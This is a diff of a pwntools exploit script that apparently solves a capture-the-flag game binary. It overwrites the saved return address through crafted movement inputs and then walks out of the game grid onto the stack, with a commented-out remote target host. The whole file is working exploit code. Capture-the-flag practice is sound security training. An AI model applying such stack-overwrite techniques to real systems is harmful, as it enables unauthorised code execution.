@@ -1,15 +1,33 @@
 from pwn import *
+
+#p = remote('xebec.cylabacademy.net', 28932)
 p = process('./game')
-auto_win = b'wwwwwaaaaaaasawddddddddds'
-completions = b'l\x04ddaa'
-win = 0x80497bc
-payload = auto_win + completions 
 
-up = b'w' * 29
 
-level = b'wd' + up + b'l\x05aaaaaaap'
+# Debugging code I used to figure out whether the saved EIP was overwritten
 
-payload = (b'l\x05') + (b'w' * 5) + (b'a' * 6) + (b's') + (b'a' * (5)) + (b'w') + (b'd' * 6) + (b's') * 2
+#gdb.attach(p, '''
+#            break *0x0804968f if *(int*)($ebp+4) == 0x08049970
+#            continue
+#           ''')
 
-p.sendline(payload)
+# Change character to byte necessary to turn the eip 
+# in move_player to the address of the level variable increment
+
+p.send(b'l\x70')
+auto_win = b'wwwaaaaawaaawdddddddds'
+
+for i in range(4):
+    p.sendline(auto_win + b'p')
+p.sendline((b'ddddp'))
+
+# Get to the stack at -51 (y, x) = (-1, 39) using the index formula
+# index = y * 90 + x
+ 
+p.sendline((b'w' * 29) + (b'a' * 50) + b'w')
+p.sendline(auto_win)
+p.sendline(b'd' * 19)
+p.sendline(b'l\xfew')
+
+
 p.interactive()
